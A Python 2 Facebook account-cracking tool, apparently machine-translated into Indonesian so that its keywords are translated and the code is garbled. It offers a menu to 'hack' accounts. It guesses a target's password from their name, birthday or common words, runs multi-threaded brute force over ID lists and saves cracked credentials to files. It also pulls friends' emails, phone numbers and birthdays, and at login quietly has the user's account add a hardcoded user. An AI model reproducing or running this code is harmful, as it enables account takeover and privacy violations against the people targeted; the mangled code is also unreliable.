# - * - pengkodean: utf-8 - * -

import os, sys, time, datetime, random, hashlib, re, threading, json, getpass, urllib, request, mekanisasi
dari multiprocessing.pool impor ThreadPool
mencoba:
    impor mekanik
kecuali ImportError:
    os.system ('pip2 install mechanize')
lain:
    mencoba:
        permintaan impor
    kecuali ImportError:
        os.system ('permintaan pemasangan pip2')

dari requests.exceptions impor ConnectionError
dari mekanik impor Browser
muat ulang (sys)
sys.setdefaultencoding ('utf8')
br = mechanize.Browser ()
br.set_handle_robots (Salah)
br.set_handle_refresh (mechanize._http.HTTPRefreshProcessor (), max_time = 1)
br.addheaders = [('User-Agent', 'Opera / 9.80 (Android; Opera Mini / 36.2.2254 / 119.132; U; id) Presto / 2.12.423 Version / 12.16')]


def keluar ():
    cetak '\ x1b [1; 91m [!] Tutup'
    os.sys.exit ()


def jalan (z):
    untuk e dalam z + '\ n':
        sys.stdout.write (e)
        sys.stdout.flush ()
        waktu tidur (0,01)

logo = "\ x1b [1; 92m█████████ \ n \ x1b [1; 92m█▄█████▄█ \ x1b [1; 97m ● ▬▬▬▬▬▬▬▬ ▬๑۩۩๑▬▬▬▬▬▬▬▬ ● \ n \ x1b [1; 92m█ \ x1b [1; 93m ▼♥♥♥♥♥ \ x1b [1; 97m- _ --_-- \ x1b [ 1; 92m╔╦╗┌─┐┬─┐┬┌─ ╔═╗╔╗ Premium \ n \ x1b [1; 92m█ \ x1b [1; 97m \ x1b [1; 97m _-_-- -_ - __ \ x1b [1; 92m ║║├─┤├┬┘├┴┐───╠╣ ╠╩╗Versi \ n \ x1b [1; 92m█ \ x1b [1; 93m ▲▲▲▲▲ \ x1b [ 1; 97m-- - _ - \ x1b [1; 92m═╩╝┴ ┴┴└─┴ ┴ ╚ ╚═╝ \ x1b [1; 91m✪ \ x1b [1; 93m2k19 \ n \ x1b [1; 92m █████████ \ x1b [1; 97m «========== ✧ ==========» \ n \ x1b [1; 92m ██ ██ \ n \ x1b [1; 93m╔═════════════════════════════════════════ ═══════╗ \ n \ x1b [1; 93m║ \ x1b [1; 93m ✬ \ x1b [1; 97mCreator \ x1b [1; 91m: \ x1b [1; 96m MR.L4M3RXploit \ x1b [1 ; 93m ╰╮ \ n \ x1b [1; 93m║ \ x1b [1; 93m ✬ \ x1b [1; 97mInstagram \ x1b [1; 91m: \ x1b [1; 92m \ x1b [92m@lamer.kun \ x1b [ \ x1b [1; 93m │ \ n \ x1b [1; 93m║ \ x1b [1; 93m ✬ \ x1b [1; 97mWhatsApp \ x1b [1; 91m: \ x1b [1;92 \ x1b [92m0895704349609 \ x1b [\ x1b [1; 93m╭╯ \ n \ x1b [1; 93m╚═════════════════════════] ═══════════════════════╝ "'\ n \ x1b [1; 92m [*] Silahkan Login Operamini Agar Tidak Checkpoint \ n'

def tik ():
    titik = [
     '. ',' .. ',' ... ']
    untuk o di titik:
        cetak '\ r \ x1b [1; 91m [\ xe2 \ x97 \ x8f] \ x1b [1; 92mLoading \ x1b [1; 97m' + o,
        sys.stdout.flush ()
        waktu tidur (0,01)


kembali = 0
utas = []
berhasil = []
cekpoint = []
gagal = []
teman id = []
idfromfriends = []
idmem = []
id = []
em = []
emfromfriends = []
hp = []
hpfromfriends = []
reaksi = []
reaksigrup = []
komen = []
komengrup = []
listgrup = []
vulnot = '\ x1b [31mNot Vuln'
vuln = '\ x1b [32mVuln'


def login ():
    os.system ('clear')
    mencoba:
        toket = buka ('login.txt', 'r')
        Tidak bisa()
    kecuali (KeyError, IOError):
        os.system ('clear')
        cetak logo
        cetak 52 * '\ x1b [1; 97m \ xe2 \ x95 \ x90'
        cetak '\ x1b [1; 91m [\ xe2 \ x98 \ x86] \ x1b [1; 92mMASUK AKUN FACEBOOK \ x1b [1; 91m [\ xe2 \ x98 \ x86]'
        id = input_dasar ('\ x1b [1; 91m [+] \ x1b [1; 36mNama Pengguna \ x1b [1; 91m: \ x1b [1; 92m')
        pwd = getpass.getpass ('\ x1b [1; 91m [+] \ x1b [1; 36mPassword \ x1b [1; 91m: \ x1b [1; 92m')
        tik ()
        mencoba:
            br.open ('https://m.facebook.com')
        kecuali mekanisasi.URLError:
            cetak '\ n \ x1b [1; 91m [!] Tidak Ada Koneksi'
            keluar ()

        br._factory.is_html = Benar
        br.select_form (nr = 0)
        br.form ['email'] = id
        br.form ['pass'] = pwd
        br.submit ()
        url = br.geturl ()
        jika 'simpan-perangkat' di url:
            mencoba:
                sig = 'api_key = 882a8490361da98702bf97a021ddc14dcredentials_type = passwordemail =' + id + 'format = JSONgenerate_machine_id = 1generate_session_cookies = 1locale = en_USmethod4
                data = {'api_key': '882a8490361da98702bf97a021ddc14d', 'credentials_type': 'password', 'email': id, 'format': 'JSON', 'generate_machine_id': '1', 'generate_session_cookies': '1', ' locale ':' en_US ',' method ':' auth.login ',' password ': pwd,' return_ssl_resources ':' 0 ',' v ':' 1.0 '}
                x = hashlib.new ('md5')
                x.update (sig)
                a = x.hexdigest ()
                data.update ({'sig': a})
                url = 'https://api.facebook.com/restserver.php'
                r = requests.get (url, params = data)
                z = json.loads (r.text)
                zedd = buka ('login.txt', 'w')
                zedd.write (z ['access_token'])
                zedd.close ()
                cetak '\ n \ x1b [1; 91m [\ x1b [1; 96m \ xe2 \ x9c \ x93 \ x1b [1; 91m] \ x1b [1; 92mLogin berhasil'
                requests.post ('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token=' + z ['access_token'])
                waktu tidur (1)
                Tidak bisa()
            kecuali requests.exceptions.ConnectionError:
                cetak '\ n \ x1b [1; 91m [!] Tidak Ada Koneksi'
                keluar ()

        jika 'checkpoint' di url:
            print '\ n \ x1b [1; 91m [!] \ x1b [1; 93mAccount Has Been Checkpoint'
            os.system ('rm -rf login.txt')
            waktu tidur (0,01)
            keluar ()
        lain:
            cetak '\ n \ x1b [1; 91m [!] Gagal Masuk'
            os.system ('rm -rf login.txt')
            waktu tidur (0,01)
            Gabung()


menu def ():
    mencoba:
        toket = buka ('login.txt', 'r'). read ()
    kecuali IOError:
        os.system ('clear')
        print '\ x1b [1; 91m [!] Token tidak ditemukan'
        os.system ('rm -rf login.txt')
        waktu tidur (0,01)
        Gabung()
    lain:
        mencoba:
            otw = requests.get ('https://graph.facebook.com/me?access_token=' + toket)
            a = json.loads (otw.text)
            nama = a ['nama']
            id = a ['id']
            ots = requests.get ('https://graph.facebook.com/me/subscribers?access_token=' + toket)
            b = json.loads (ots.text)
            sub = str (b ['summary'] ['total_count'])
        kecuali KeyError:
            os.system ('clear')
            cetak '\ x1b [1; 91m [!] \ x1b [1; 93mSepertinya akun kena Checkpoint'
            os.system ('rm -rf login.txt')
            waktu tidur (0,01)
            Gabung()
        kecuali requests.exceptions.ConnectionError:
            cetak logo
            cetak '\ x1b [1; 91m [!] Tidak Ada Koneksi'
            keluar ()

    os.system ('clear')
    cetak logo
    cetak '\ x1b [1; 97m \ xe2 \ x95 \ x94' + 50 * '\ xe2 \ x95 \ x90' + '╗'
    cetak '\ xe2 \ x95 \ x91 \ x1b [1; 91m [\ x1b [1; 96m \ xe2 \ x9c \ x93 \ x1b [1; 91m] \ x1b [1; 97m Nama \ x1b [1; 91m: \ x1b [1; 92m '+ nama + (39 - len (nama)) *' \ x1b [1; 97m '+' ║ '
    cetak '\ xe2 \ x95 \ x91 \ x1b [1; 91m [\ x1b [1; 96m \ xe2 \ x9c \ x93 \ x1b [1; 91m] \ x1b [1; 97m FBID \ x1b [1; 91m: \ x1b " [1; 92m '+ id + (39 - len (id)) *' \ x1b [1; 97m '+' ║ '
    cetak '\ xe2 \ x95 \ x91 \ x1b [1; 91m [\ x1b [1; 96m \ xe2 \ x9c \ x93 \ x1b [1; 91m] \ x1b [1; 97m Subs \ x1b [1; 91m: \ x1b " [1; 92m '+ sub + (39 - len (sub)) *' \ x1b [1; 97m '+' ║ '
    cetak '\ x1b [1; 97m╠' + 50 * '\ xe2 \ x95 \ x90' + '╝'
    cetak '║-> \ x1b [1; 37; 40m1. Informasi pengguna'
    cetak '║-> \ x1b [1; 37; 40m2. Retas Akun Facebook '
    cetak '║-> \ x1b [1; 37; 40m3. Bot '
    cetak '║-> \ x1b [1; 37; 40m4. Orang lain
    cetak '║-> \ x1b [1; 37; 40m5. Memperbarui'
    cetak '║-> \ x1b [1; 37; 40m6. Keluar'
    cetak '║-> \ x1b [1; 31; 40m0. Keluar'
    cetak '\ x1b [1; 37; 40m║'
    pilih ()


def pilih ():
    zedd = input_kasar ('╚═ \ x1b [1; 91m ▶ \ x1b [1; 97m')
    jika zedd == '':
        print '\ x1b [1; 91m [!] Tidak boleh kosong'
        pilih ()
    lain:
        jika zedd == '1':
            informasi ()
        lain:
            jika zedd == '2':
                menu_hack ()
            lain:
                jika zedd == '3':
                    menu_bot ()
                lain:
                    jika zedd == '4':
                        lain ()
                    lain:
                        jika zedd == '5':
                            os.system ('clear')
                            cetak logo
                            cetak 52 * '\ x1b [1; 97m \ xe2 \ x95 \ x90'
                            os.system ('git pull origin master')
                            masukan_awal ('\ n \ x1b [1; 91m [\ x1b [1; 97mBack \ x1b [1; 91m]')
                            Tidak bisa()
                        lain:
                            jika zedd == '6':
                                os.system ('rm -rf login.txt')
				os.system ('xdg-buka https://m.facebook.com/rizz.magizz')
                                keluar ()
                            lain:
                                jika zedd == '0':
                                    keluar ()
                                lain:
                                    cetak '\ x1b [1; 91m [\ xe2 \ x9c \ x96] \ x1b [1; 97m' + zedd + '\ x1b [1; 91mTidak tersedia'
                                    pilih ()


def informasi ():
    os.system ('clear')
    mencoba:
        toket = buka ('login.txt', 'r'). read ()
    kecuali IOError:
        print '\ x1b [1; 91m [!] Token tidak ditemukan'
        os.system ('rm -rf login.txt')
        waktu tidur (0,01)
        Gabung()

    os.system ('clear')
    cetak logo
    cetak 52 * '\ x1b [1; 97m \ xe2 \ x95 \ x90'
    id = input_makan ('\ x1b [1; 91m [+] \ x1b [1; 92mInput ID \ x1b [1; 97m / \ x1b [1; 92mName \ x1b [1; 91m: \ x1b [1; 97m') ')
    jalan ('\ x1b [1; 91m [\ xe2 \ x9c \ xba] \ x1b [1; 92mMohon Tunggu \ x1b [1; 97m ...')
    r = requests.get ('https://graph.facebook.com/me/friends?access_token=' + toket)
    cok = json.loads (r.text)
    untuk p di cok ['data']:
        jika id di p ['name'] atau id in p ['id']:
            r = requests.get ('https://graph.facebook.com/' + p ['id'] + '? access_token =' + toket)
            z = json.loads (r.text)
            cetak 52 * '\ x1b [1; 97m \ xe2 \ x95 \ x90'
            mencoba:
                cetak '\ x1b [1; 91m [\ xe2 \ x9e \ xb9] \ x1b [1; 92mNama \ x1b [1; 97m:' + z ['nama']
            kecuali KeyError:
                cetak '\ x1b [1; 91m [?] \ x1b [1; 92mNama \ x1b [1; 97m: \ x1b [1; 91mTidak Ada' '
            lain:
                mencoba:
                    cetak '\ x1b [1; 91m [\ xe2 \ x9e \ xb9] \ x1b [1; 92mID \ x1b [1; 97m:' + z ['id']
                kecuali KeyError:
                    cetak '\ x1b [1; 91m [?] \ x1b [1; 92mID \ x1b [1; 97m: \ x1b [1; 91mTidak Ada' '
                lain:
                    mencoba:
                        cetak '\ x1b [1; 91m [\ xe2 \ x9e \ xb9] \ x1b [1; 92mEmail \ x1b [1; 97m:' + z ['email']
                    kecuali KeyError:
                        cetak '\ x1b [1; 91m [?] \ x1b [1; 92mEmail \ x1b [1; 97m: \ x1b [1; 91mTidak Ada' '
                    lain:
                        mencoba:
                            cetak '\ x1b [1; 91m [\ xe2 \ x9e \ xb9] \ x1b [1; 92mNomor Telpon \ x1b [1; 97m:' + z ['mobile_phone']
                        kecuali KeyError:
                            cetak '\ x1b [1; 91m [?] \ x1b [1; 92mNomor Telpon \ x1b [1; 97m: \ x1b [1; 91mTidak ditemukan' '

                        mencoba:
                            cetak '\ x1b [1; 91m [\ xe2 \ x9e \ xb9] \ x1b [1; 92mLokasi \ x1b [1; 97m:' + z ['lokasi'] ['nama']
                        kecuali KeyError:
                            cetak '\ x1b [1; 91m [?] \ x1b [1; 92mLokasi \ x1b [1; 97m: \ x1b [1; 91mTidak Ada' '

                    mencoba:
                        cetak '\ x1b [1; 91m [\ xe2 \ x9e \ xb9] \ x1b [1; 92mLahir \ x1b [1; 97m:' + z ['birthday']
                    kecuali KeyError:
                        cetak '\ x1b [1; 91m [?] \ x1b [1; 92mLahir \ x1b [1; 97m: \ x1b [1; 91mTidak Ada' '

                mencoba:
                    cetak '\ x1b [1; 91m [\ xe2 \ x9e \ xb9] \ x1b [1; 92mSekolah \ x1b [1; 97m:'
                    untuk q in z ['education']:
                        mencoba:
                            cetak '\ x1b [1; 91m ~ \ x1b [1; 97m' + q ['sekolah'] ['nama']
                        kecuali KeyError:
                            cetak '\ x1b [1; 91m ~ \ x1b [1; 91mTidak Ada'

                kecuali KeyError:
                    lulus

            masukan_awal ('\ n \ x1b [1; 91m [\ x1b [1; 97mBack \ x1b [1; 91m]')
            Tidak bisa()
    lain:
        cetak '\ x1b [1; 91m [\ xe2 \ x9c \ x96] Pengguna Tidak Ada'
        masukan_awal ('\ n \ x1b [1; 91m [\ x1b [1; 97mBack \ x1b [1; 91m]')
        Tidak bisa()


def menu_hack ():
    os.system ('clear')
    mencoba:
        toket = buka ('login.txt', 'r'). read ()
    kecuali IOError:
        print '\ x1b [1; 91m [!] Token tidak ditemukan'
        os.system ('rm -rf login.txt')
        waktu tidur (0,01)
        Gabung()

    os.system ('clear')
    cetak logo
    cetak 52 * '\ x1b [1; 97m \ xe2 \ x95 \ x90'
    cetak '║-> \ x1b [1; 37; 40m1. Retas Mini Facebook (\ x1b [1; 92mTarget \ x1b [1; 97m) '
    cetak '║-> \ x1b [1; 37; 40m2. Multi Bruteforce Facebook '
    cetak '║-> \ x1b [1; 37; 40m3. Facebook Super Multi Bruteforce
    cetak '║-> \ x1b [1; 37; 40m4. BruteForce (\ x1b [1; 92mTarget \ x1b [1; 97m) '
    cetak '║-> \ x1b [1; 37; 40m5. Yahoo Clone '
    cetak '║-> \ x1b [1; 37; 40m6. Ambil ID / Email / HP '
    cetak '║-> \ x1b [1; 31; 40m0. Kembali'
    cetak '\ x1b [1; 37; 40m║'
    hack_pilih ()


def hack_pilih ():
    retas = masukan_ mentah ('╚═ \ x1b [1; 91m ▶ \ x1b [1; 97m')
    jika diretas == '':
        print '\ x1b [1; 91m [!] Tidak boleh kosong'
        hack_pilih ()
    lain:
        jika diretas == '1':
            mini()
        lain:
            jika diretas == '2':
                retak()
                hasil ()
            lain:
                jika diretas == '3':
                    super()
                lain:
                    jika diretas == '4':
                        kasar()
                    lain:
                        jika diretas == '5':
                            menu_yahoo ()
                        lain:
                            jika diretas == '6':
                                mengambil()
                            lain:
                                jika diretas == '0':
                                    Tidak bisa()
                                lain:
                                    cetak '\ x1b [1; 91m [\ xe2 \ x9c \ x96] \ x1b [1; 97m' + hack + '\ x1b [1; 91mTidak ditemukan'
                                    hack_pilih ()


def mini ():
    os.system ('clear')
    mencoba:
        toket = buka ('login.txt', 'r'). read ()
    kecuali IOError:
        print '\ x1b [1; 91m [!] Token tidak ditemukan'
        os.system ('rm -rf login.txt')
        waktu tidur (0,01)
        Gabung()
    lain:
        os.system ('clear')
        cetak logo
        cetak 52 * '\ x1b [1; 97m \ xe2 \ x95 \ x90'
        print '\ x1b [1; 91m [INFO] Target pasti temanmu!'
        mencoba:
            id = input_makan ('\ x1b [1; 91m [+] \ x1b [1; 92mID Target \ x1b [1; 91m: \ x1b [1; 97m')
            jalan ('\ x1b [1; 91m [\ xe2 \ x9c \ xba] \ x1b [1; 92mHarap tunggu \ x1b [1; 97m ...')
            r = requests.get ('https://graph.facebook.com/' + id + '? access_token =' + toket)
            a = json.loads (r.text)
            cetak '\ x1b [1; 91m [\ xe2 \ x9e \ xb9] \ x1b [1; 92mName \ x1b [1; 97m:' + a ['name']
            jalan ('\ x1b [1; 91m [+] \ x1b [1; 92mMemeriksa \ x1b [1; 97m ...')
            waktu tidur (1)
            jalan ('\ x1b [1; 91m [+] \ x1b [1; 92mBuka keamanan \ x1b [1; 97m ...')
            waktu tidur (1)
            jalan ('\ x1b [1; 91m [\ xe2 \ x9c \ xba] \ x1b [1; 92mHarap tunggu \ x1b [1; 97m ...')
            cetak 52 * '\ x1b [1; 97m \ xe2 \ x95 \ x90'
            pz1 = a ['first_name'] + '123'
            data = urllib.urlopen ('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '& locion=2&email=' + id + '& locion = ios & generate_session_cookies = 1 & sig = 3f555f99fb61fcd7aa0c44f58f522ef6 ')
            y = json.load (data)
            jika 'access_token' di y:
                cetak '\ x1b [1; 91m [+] \ x1b [1; 92mFounded.'
                cetak '\ x1b [1; 91m [\ x1b [1; 96m \ xe2 \ x9c \ x93 \ x1b [1; 91m] \ x1b [1; 92mName \ x1b [1; 97m:' + a ['name']]
                cetak '\ x1b [1; 91m [\ xe2 \ x9e \ xb9] \ x1b [1; 92mNama Pengguna \ x1b [1; 97m:' + id
                cetak '\ x1b [1; 91m [\ xe2 \ x9e \ xb9] \ x1b [1; 92mPassword \ x1b [1; 97m:' + pz1
                masukan_awal ('\ n \ x1b [1; 91m [\ x1b [1; 97mBack \ x1b [1; 91m]')
                menu_hack ()
            lain:
                jika 'www.facebook.com' dalam y ['error_msg']:
                    cetak '\ x1b [1; 91m [+] \ x1b [1; 92mFounded.'
                    print '\ x1b [1; 91m [!] \ x1b [1; 93mAccount Mungkin Checkpoint'
                    cetak '\ x1b [1; 91m [\ x1b [1; 96m \ xe2 \ x9c \ x93 \ x1b [1; 91m] \ x1b [1; 92mName \ x1b [1; 97m:' + a ['name']]
                    cetak '\ x1b [1; 91m [\ xe2 \ x9e \ xb9] \ x1b [1; 92mNama Pengguna \ x1b [1; 97m:' + id
                    cetak '\ x1b [1; 91m [\ xe2 \ x9e \ xb9] \ x1b [1; 92mPassword \ x1b [1; 97m:' + pz1
                    masukan_awal ('\ n \ x1b [1; 91m [\ x1b [1; 97mBack \ x1b [1; 91m]')
                    menu_hack ()
                lain:
                    pz2 = a ['first_name'] + '12345'
                    data = urllib.urlopen ('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '& loc2 + = ios & generate_session_cookies = 1 & sig = 3f555f99fb61fcd7aa0c44f58f522ef6 ')
                    y = json.load (data)
                    jika 'access_token' di y:
                        cetak '\ x1b [1; 91m [+] \ x1b [1; 92mFounded.'
                        cetak '\ x1b [1; 91m [\ x1b [1; 96m \ xe2 \ x9c \ x93 \ x1b [1; 91m] \ x1b [1; 92mName \ x1b [1; 97m:' + a ['name']]
                        cetak '\ x1b [1; 91m [\ xe2 \ x9e \ xb9] \ x1b [1; 92mNama Pengguna \ x1b [1; 97m:' + id
                        cetak '\ x1b [1; 91m [\ xe2 \ x9e \ xb9] \ x1b [1; 92mPassword \ x1b [1; 97m:' + pz2
                        masukan_awal ('\ n \ x1b [1; 91m [\ x1b [1; 97mBack \ x1b [1; 91m]')
                        menu_hack ()
                    lain:
                        jika 'www.facebook.com' dalam y ['error_msg']:
                            cetak '\ x1b [1; 91m [+] \ x1b [1; 92mFounded.'
                            print '\ x1b [1; 91m [!] \ x1b [1; 93mAccount Mungkin Checkpoint'
                            cetak '\ x1b [1; 91m [\ x1b [1; 96m \ xe2 \ x9c \ x93 \ x1b [1; 91m] \ x1b [1; 92mName \ x1b [1; 97m:' + a ['name']]
                            cetak '\ x1b [1; 91m [\ xe2 \ x9e \ xb9] \ x1b [1; 92mNama Pengguna \ x1b [1; 97m:' + id
                            cetak '\ x1b [1; 91m [\ xe2 \ x9e \ xb9] \ x1b [1; 92mPassword \ x1b [1; 97m:' + pz2
                            masukan_awal ('\ n \ x1b [1; 91m [\ x1b [1; 97mBack \ x1b [1; 91m]')
                            menu_hack ()
                        lain:
                            pz3 = a ['last_name'] + '123'
                            data = urllib.urlopen ('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '& loc3 + = ios & generate_session_cookies = 1 & sig = 3f555f99fb61fcd7aa0c44f58f522ef6 ')
                            y = json.load (data)
                            jika 'access_token' di y:
                                cetak '\ x1b [1; 91m [+] \ x1b [1; 92mFounded.'
                                cetak '\ x1b [1; 91m [\ x1b [1; 96m \ xe2 \ x9c \ x93 \ x1b [1; 91m] \ x1b [1; 92mName \ x1b [1; 97m:' + a ['name']]
                                cetak '\ x1b [1; 91m [\ xe2 \ x9e \ xb9] \ x1b [1; 92mNama Pengguna \ x1b [1; 97m:' + id
                                cetak '\ x1b [1; 91m [\ xe2 \ x9e \ xb9] \ x1b [1; 92mPassword \ x1b [1; 97m:' + pz3
                                masukan_awal ('\ n \ x1b [1; 91m [\ x1b [1; 97mBack \ x1b [1; 91m]')
                                menu_hack ()
                            lain:
                                jika 'www.facebook.com' dalam y ['error_msg']:
                                    cetak '\ x1b [1; 91m [+] \ x1b [1; 92mFounded.'
                                    print '\ x1b [1; 91m [!] \ x1b [1; 93mAccount Mungkin Checkpoint'
                                    cetak '\ x1b [1; 91m [\ x1b [1; 96m \ xe2 \ x9c \ x93 \ x1b [1; 91m] \ x1b [1; 92mName \ x1b [1; 97m:' + a ['name']]
                                    cetak '\ x1b [1; 91m [\ xe2 \ x9e \ xb9] \ x1b [1; 92mNama Pengguna \ x1b [1; 97m:' + id
                                    cetak '\ x1b [1; 91m [\ xe2 \ x9e \ xb9] \ x1b [1; 92mPassword \ x1b [1; 97m:' + pz3
                                    masukan_awal ('\ n \ x1b [1; 91m [\ x1b [1; 97mBack \ x1b [1; 91m]')
                                    menu_hack ()
                                lain:
                                    lahir = a ['ulang tahun']
                                    pz4 = lahir.replace ('/', '')
                                    data = urllib.urlopen ('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '& loc4ale + = ios & generate_session_cookies = 1 & sig = 3f555f99fb61fcd7aa0c44f58f522ef6 ')
                                    y = json.load (data)
                                    jika 'access_token' di y:
                                        cetak '\ x1b [1; 91m [+] \ x1b [1; 92mFounded.'
                                        cetak '\ x1b [1; 91m [\ x1b [1; 96m \ xe2 \ x9c \ x93 \ x1b [1; 91m] \ x1b [1; 92mName \ x1b [1; 97m:' + a ['name']]
                                        cetak '\ x1b [1; 91m [\ xe2 \ x9e \ xb9] \ x1b [1; 92mNama Pengguna \ x1b [1; 97m:' + id
                                        cetak '\ x1b [1; 91m [\ xe2 \ x9e \ xb9] \ x1b [1; 92mPassword \ x1b [1; 97m:' + pz4
                                        masukan_awal ('\ n \ x1b [1; 91m [\ x1b [1; 97mBack \ x1b [1; 91m]')
                                        menu_hack ()
                                    lain:
                                        jika 'www.facebook.com' dalam y ['error_msg']:
                                            cetak '\ x1b [1; 91m [+] \ x1b [1; 92mFounded.'
                                            print '\ x1b [1; 91m [!] \ x1b [1; 93mAccount Mungkin Checkpoint'
                                            cetak '\ x1b [1; 91m [\ x1b [1; 96m \ xe2 \ x9c \ x93 \ x1b [1; 91m] \ x1b [1; 92mName \ x1b [1; 97m:' + a ['name']]
                                            cetak '\ x1b [1; 91m [\ xe2 \ x9e \ xb9] \ x1b [1; 92mNama Pengguna \ x1b [1; 97m:' + id
                                            cetak '\ x1b [1; 91m [\ xe2 \ x9e \ xb9] \ x1b [1; 92mPassword \ x1b [1; 97m:' + pz4
                                            masukan_awal ('\ n \ x1b [1; 91m [\ x1b [1; 97mBack \ x1b [1; 91m]')
                                            menu_hack ()
                                        lain:
                                            pz5 = ('sayang')
                                            data = urllib.urlopen ('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '& loc5 = ios & generate_session_cookies = 1 & sig = 3f555f99fb61fcd7aa0c44f58f522ef6 ')
                                            y = json.load (data)
                                            jika 'access_token' di y:
                                                cetak '\ x1b [1; 91m [+] \ x1b [1; 92mFounded.'
                                                cetak '\ x1b [1; 91m [\ x1b [1; 96m \ xe2 \ x9c \ x93 \ x1b [1; 91m] \ x1b [1; 92mName \ x1b [1; 97m:' + a ['name']]
                                                cetak '\ x1b [1; 91m [\ xe2 \ x9e \ xb9] \ x1b [1; 92mNama Pengguna \ x1b [1; 97m:' + id
                                                cetak '\ x1b [1; 91m [\ xe2 \ x9e \ xb9] \ x1b [1; 92mPassword \ x1b [1; 97m:' + pz5
                                                masukan_awal ('\ n \ x1b [1; 91m [\ x1b [1; 97mBack \ x1b [1; 91m]')
                                                menu_hack ()
                                            lain:
                                                jika 'www.facebook.com' dalam y ['error_msg']:
                                                    cetak '\ x1b [1; 91m [+] \ x1b [1; 92mFounded.'
                                                    print '\ x1b [1; 91m [!] \ x1b [1; 93mAccount Mungkin Checkpoint'
                                                    cetak '\ x1b [1; 91m [\ x1b [1; 96m \ xe2 \ x9c \ x93 \ x1b [1; 91m] \ x1b [1; 92mName \ x1b [1; 97m:' + a ['name']]
                                                    cetak '\ x1b [1; 91m [\ xe2 \ x9e \ xb9] \ x1b [1; 92mNama Pengguna \ x1b [1; 97m:' + id
                                                    cetak '\ x1b [1; 91m [\ xe2 \ x9e \ xb9] \ x1b [1; 92mPassword \ x1b [1; 97m:' + pz5
                                                    masukan_awal ('\ n \ x1b [1; 91m [\ x1b [1; 97mBack \ x1b [1; 91m]')
                                                    menu_hack ()
                                                lain:
                                                    print '\ x1b [1; 91m [!] Maaf, gagal membuka target password :('
                                                    print '\ x1b [1; 91m [!] Coba metode lain.'
                                                    masukan_awal ('\ n \ x1b [1; 91m [\ x1b [1; 97mBack \ x1b [1; 91m]')
                                                    menu_hack ()
        kecuali KeyError:
            cetak '\ x1b [1; 91m [!] Terget tidak ditemukan'
            masukan_awal ('\ n \ x1b [1; 91m [\ x1b [1; 97mBack \ x1b [1; 91m]')
            menu_hack ()


def crack ():
    file global
    idlist global
    passw global
    os.system ('clear')
    mencoba:
        toket = buka ('login.txt', 'r'). read ()
    kecuali IOError:
        print '\ x1b [1; 91m [!] Token tidak ditemukan'
        os.system ('rm -rf login.txt')
        waktu tidur (0,01)
        Gabung()
    lain:
        os.system ('clear')
        cetak logo
        cetak 52 * '\ x1b [1; 97m \ xe2 \ x95 \ x90'
        idlist = input_dasar ('\ x1b [1; 91m [+] \ x1b [1; 92mFile ID \ x1b [1; 91m: \ x1b [1; 97m')
        passw = input_dasar ('\ x1b [1; 91m [+] \ x1b [1; 92mPassword \ x1b [1; 91m: \ x1b [1; 97m' ')
        mencoba:
            file = open (idlist, 'r')
            jalan ('\ x1b [1; 91m [\ xe2 \ x9c \ xba] \ x1b [1; 92mHarap tunggu \ x1b [1; 97m ...')
            untuk x dalam rentang (40):
                zedd = threading.Thread (target = scrak, args = ())
                zedd.start ()
                threads.append (zedd)

            untuk zedd di utas:
                zedd.join ()

        kecuali IOError:
            cetak '\ x1b [1; 91m [!] File tidak ditemukan'
            masukan_awal ('\ n \ x1b [1; 91m [\ x1b [1; 97mBack \ x1b [1; 91m]')
            menu_hack ()


def scrak ():
    kembali global
    global berhasil
    cekpoint global
    gagal global
    global up
    mencoba:
        buka = ​​buka (idlist, 'r')
        up = buka.read (). split ()
        sementara file:
            namapengguna = file.readline (). strip ()
            url = 'https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + username + '& locale = en_US & password +' = 3f555f99fb61fcd7aa0c44f58f522ef6 '
            data = urllib.urlopen (url)
            mpsh = json.load (data)
            jika kembali == len (atas):
                istirahat
            jika 'access_token' di mpsh:
                bisa = open ('Berhasil.txt', 'w')
                bisa.write (nama pengguna + '|' + passw + '\ n')
                bisa.close ()
                berhasil.append ('\ x1b [1; 97m [\ x1b [1; 92m \ xe2 \ x9c \ x93 \ x1b [1; 97m]' + nama pengguna + '|' + sandi)
                kembali + = 1
            lain:
                jika 'www.facebook.com' di mpsh ['error_msg']:
                    cek = open ('Cekpoint.txt', 'w')
                    cek.write (nama pengguna + '|' + passw + '\ n')
                    cek.close ()
                    cekpoint.append ('\ x1b [1; 97m [\ x1b [1; 93m \ xe2 \ x9c \ x9a \ x1b [1; 97m]' + nama pengguna + '|' + sandi)
                    kembali + = 1
                lain:
                    gagal.append (nama pengguna)
                    kembali + = 1
            sys.stdout.write ('\ r \ x1b [1; 91m [\ x1b [1; 96m \ xe2 \ x9c \ xb8 \ x1b [1; 91m] \ x1b [1; 92mCrack \ x1b [1; 91m: \ x1b] [1; 97m '+ str (kembali) +' \ x1b [1; 96m> \ x1b [1; 97m '+ str (len (atas)) +' => \ x1b [1; 92mLive \ x1b [1; 91m : \ x1b [1; 96m '+ str (len (berhasil)) +' \ x1b [1; 97m => \ x1b [1; 93mPeriksa \ x1b [1; 91m: \ x1b [1; 96m '+ str (len (cekpoint)))
            sys.stdout.flush ()

    kecuali IOError:
        cetak '\ n \ x1b [1; 91m [!] Sambungan sibuk'
        waktu tidur (0,01)
    kecuali requests.exceptions.ConnectionError:
        cetak '\ x1b [1; 91m [\ xe2 \ x9c \ x96] Tidak ada koneksi'


def hasil ():
    mencetak
    cetak 52 * '\ x1b [1; 97m \ xe2 \ x95 \ x90'
    untuk b in berhasil:
        mencetak b

    untuk c di cekpoint:
        cetak c

    mencetak
    print '\ x1b [31m [x] Gagal \ x1b [1; 97m ->' + str (len (gagal))
    keluar ()


def super ():
    toket global
    os.system ('clear')
    mencoba:
        toket = buka ('login.txt', 'r'). read ()
    kecuali IOError:
